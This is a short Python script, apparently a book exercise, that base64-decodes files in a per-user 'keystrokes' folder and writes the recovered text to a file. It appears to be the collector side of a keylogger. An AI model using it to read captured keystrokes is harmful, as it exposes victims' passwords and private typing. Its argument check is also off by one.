import base64 
import os
import sys

ENCODED_DIR = "/home/bright/Desktop/IMPORTANT/chapter_8/data"
DECODED_DIR = "/home/bright/Desktop/IMPORTANT/chapter_8/decoder/decoded_keystrokes"

decoded_texts, decoded_imgs = list(), list()

def decode_stroke(username):
    STROKE_FILE = os.path.join(ENCODED_DIR, username, "keystrokes")
    print("[*] Attempting to decode files")
    try:
        for root, _, fnames in os.walk(STROKE_FILE):
                for fname in fnames:
                    with open(os.path.join(root, fname), "r") as f:
                        decoded_text = base64.b64decode(f.read()).decode("utf-8")
                        decoded_texts.append(decoded_text)
        print('[+] Decoded strokes successfully')
    except Exception as e:
        print(f'[-] Failed to decode {e}')

    print(f'[*] Writing decoded strokes to decoded_keystrokes/{username}.txt')
    try:
        with open(os.path.join(DECODED_DIR, username+'.txt'), 'w') as f:
            for decoded_text in decoded_texts:
                f.write(decoded_text)
        print('[+] Writing completed')
    except Exception as e:
        print(f'[-] Failed to write decoded files {e}')
        sys.exit()

if __name__ == '__main__':
    if len(sys.argv) < 2:
         print('Missing some arguments')
         sys.exit()
    
    service, username = (sys.argv[1], sys.argv[2])
    
    if service.lower() == "s":
        decode_stroke(username)